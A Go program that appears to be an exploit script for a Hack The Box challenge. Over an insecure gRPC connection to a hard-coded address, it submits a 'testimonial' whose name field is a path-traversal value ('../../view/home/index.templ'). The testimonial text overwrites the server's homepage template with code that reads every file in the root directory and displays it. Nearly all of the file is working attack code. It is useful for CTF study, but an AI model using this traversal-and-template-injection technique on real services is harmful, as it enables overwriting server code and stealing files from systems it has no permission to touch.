package main

import (
	"context"
	"fmt"
	"htbchal/pb"

	// "strings"
	"sync"

	"google.golang.org/grpc"
)

var (
	grpcClient *Client
	mutex      *sync.Mutex
)

func init() {
	grpcClient = nil
	mutex = &sync.Mutex{}
}

type Client struct {
	pb.RickyServiceClient
}

func GetClient() (*Client, error) {
	mutex.Lock()
	defer mutex.Unlock()

	if grpcClient == nil {
		conn, err := grpc.Dial(fmt.Sprintf("83.136.249.253%s", ":30667"), grpc.WithInsecure())
		if err != nil {
			return nil, err
		}

		grpcClient = &Client{pb.NewRickyServiceClient(conn)}
	}

	return grpcClient, nil
}

func main() {
	c, err := GetClient()

	if err != nil {
		panic(err)
	}

	err = c.SendTestimonial()

	if err != nil {
		fmt.Println("error in sending " + err.Error())
	}

	fmt.Println("Done")
}

func (c *Client) SendTestimonial() error {
	ctx := context.Background()
	// Filter bad characters.

	customer := `../../view/home/index.templ`
	testimonial := `package home

import (
	"htbchal/view/layout"
	"io/fs"	
	"fmt"
	"os"
)
	
templ Index() {
	@layout.App(true) {
<nav class="navbar navbar-expand-lg navbar-dark bg-black">
  <div class="container-fluid">
	<a class="navbar-brand" href="/">The Fray</a>
	<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
			aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
		<span class="navbar-toggler-icon"></span>
	</button>
	<div class="collapse navbar-collapse" id="navbarNav">
		<ul class="navbar-nav ml-auto">
			<li class="nav-item active">
				<a class="nav-link" href="/">Home</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="javascript:void();">Factions</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="javascript:void();">Trials</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="javascript:void();">Contact</a>
			</li>
		</ul>
	</div>
  </div>
</nav>
	
<div class="container">
  <section class="jumbotron text-center">
	  <div class="container mt-5">
		  <h1 class="display-4">Welcome to The Fray</h1>
		  <p class="lead">Assemble your faction and prove you're the last one standing!</p>
		  <a href="javascript:void();" class="btn btn-primary btn-lg">Get Started</a>
	  </div>
  </section>

  <section class="container mt-5">
	  <h2 class="text-center mb-4">What Others Say</h2>
	  <div class="row">
		  @Testimonials()
	  </div>
  </section>


  <div class="row mt-5 mb-5">
	<div class="col-md">
	  <h2 class="text-center mb-4">Submit Your Testimonial</h2>
	  <form method="get" action="/">
		<div class="form-group">
		  <label class="mt-2" for="testimonialText">Your Testimonial</label>
		  <textarea class="form-control mt-2" id="testimonialText" rows="3" name="testimonial"></textarea>
		</div>
		<div class="form-group">
		  <label class="mt-2" for="testifierName">Your Name</label>
		  <input type="text" class="form-control mt-2" id="testifierName" name="customer"/>
		</div>
		<button type="submit" class="btn btn-primary mt-4">Submit Testimonial</button>
	  </form>
	</div>
  </div>
</div>

<footer class="bg-black text-white text-center py-3">
	<p>&copy; 2024 The Fray. All Rights Reserved.</p>
</footer>
	}
}

func GetTestimonials() []string {
	fmt.Println("Hello")
	fsys := os.DirFS("/")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
	<div class="col-md-4">
		<div class="card mb-4">
			<div class="card-body">
				<p class="card-text">"{item}"</p>
				<p class="text-muted">- Anonymous Testifier</p>
			</div>
		</div>
	</div>
  }
}`

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}
